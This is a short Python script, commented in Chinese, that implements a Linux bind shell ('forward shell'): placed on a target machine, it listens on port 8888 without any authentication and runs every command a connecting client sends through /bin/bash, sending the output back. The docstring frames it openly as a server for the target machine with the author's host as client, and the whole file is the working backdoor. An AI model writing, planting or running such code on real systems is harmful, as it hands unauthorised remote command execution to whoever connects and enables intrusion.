#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
Linux下的正向shell（server再目标机器， client是我的主机，再我的主机上连接这个server）
这个文件放在服务器端（Linux系统）
"""

import socket
from subprocess import Popen, PIPE     # 执行系统命令

HOST = ''   # 如果是本机最为服务端，地址可以不用填写
PORT = 8888
BUFSIZE = 10240
ADDR = (HOST, PORT)
tcp_server = socket.socket()   # type默认是tcp
tcp_server.bind(ADDR)
tcp_server.listen(5)
print("开始监听")

while True:
    # 服务端和客户端的循环连接
    print("Waiting fpr connecting...")
    coon, addr = tcp_server.accept()  # 获取对等套接字(conn), 以及客户端地址(addr). 这个【只执行一次】，放到外面防止阻塞
    print("... connected from:" + str(addr))
    # 下面是通信的循环
    while True:
        data = coon.recv(BUFSIZE)          # 读取客户端发送的消息 （指明一次性能接收的最大字节数量）
        data = data.decode('utf-8')
        if data:
            try:
                # 执行获取服务端的系统命令（在客户端连接后可以执行服务端的命令）
                cmd = Popen(['/bin/bash', '-c', data], stdin=PIPE, stdout=PIPE)
                cmd_data = cmd.stdout.read()
                coon.send(cmd_data)
            except Exception:
                continue

        else:
            print("客户端{}已断开".format(addr))
            break



